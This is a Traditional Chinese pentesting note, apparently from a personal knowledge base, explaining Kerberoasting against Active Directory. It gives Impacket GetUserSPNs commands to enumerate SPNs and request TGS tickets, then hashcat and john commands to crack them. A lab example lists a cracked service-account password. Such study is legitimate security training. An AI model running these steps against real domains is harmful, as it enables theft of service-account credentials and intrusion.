# 💥 域內 Kerberoasting 攻擊 (kerberoasting)

本文件說明 Active Directory 環境中 Kerberoasting 攻擊的原理、檢測方法與破解密碼 Hash 的技巧。

---

## 🔍 漏洞成因與原理

Kerberoasting 是一種針對 Active Directory 域內**設定了服務主體名稱 (SPN, Service Principal Name)** 的服務帳戶（Service Account）進行密碼哈希離線破解的技術。

在 Kerberos 協議中，任何已驗證的域使用者（不需具備高權限）都可以向金鑰分發中心 (KDC) 請求針對域內任何 SPN 的服務票據（TGS Ticket）。
KDC 在簽發 TGS 票據時，會使用該 SPN 對應的服務帳戶密碼哈希 (NTLM Hash) 來加密票據的某些部分。因此，攻擊者只要請求這些票據，並將其導出到本地，即可在離線狀態下使用暴力破解或字典攻擊來還原該服務帳戶的明文密碼。

---

## 🛠️ 常見利用與繞過技巧

### 1. 列舉具有 SPN 的帳戶
在攻擊機上使用 Impacket 套件中的 `GetUserSPNs` 進行查詢：
```bash
impacket-GetUserSPNs -dc-ip <DC_IP> <DOMAIN>/<username>:<password>
```

### 2. 請求並下載 TGS 票據
使用 `-request` 參數請求票據並將其輸出至本地檔案：
```bash
impacket-GetUserSPNs -dc-ip <DC_IP> -request -outputfile <output_filename.kerberoast> <DOMAIN>/<username>:<password>
```

### 3. 離線 Hash 破解
使用 `hashcat` 的 `13100` 模式（Kerberos 5 TGS-REP etype 23）或 `john` 對票據進行字典破解：
```bash
# Hashcat 破解
hashcat -m 13100 <output_filename.kerberoast> /usr/share/wordlists/rockyou.txt

# John 破解
john --wordlist=/usr/share/wordlists/rockyou.txt <output_filename.kerberoast>
```

---

# 實戰關聯
*   **靶機應用實例**：
    *   [[Beyond]]（在進入內網並取得 Domain user `john` 憑證後，對域控 `172.16.180.240` 發起 Kerberoasting。成功請求到 `http/internalsrv1.beyond.com` 服務帳戶 `daniela` 的 TGS，並使用 `hashcat` 破解出其密碼 `DANIelaRO123`，進而成功登入 internalsrv1 的 WordPress 後台）。
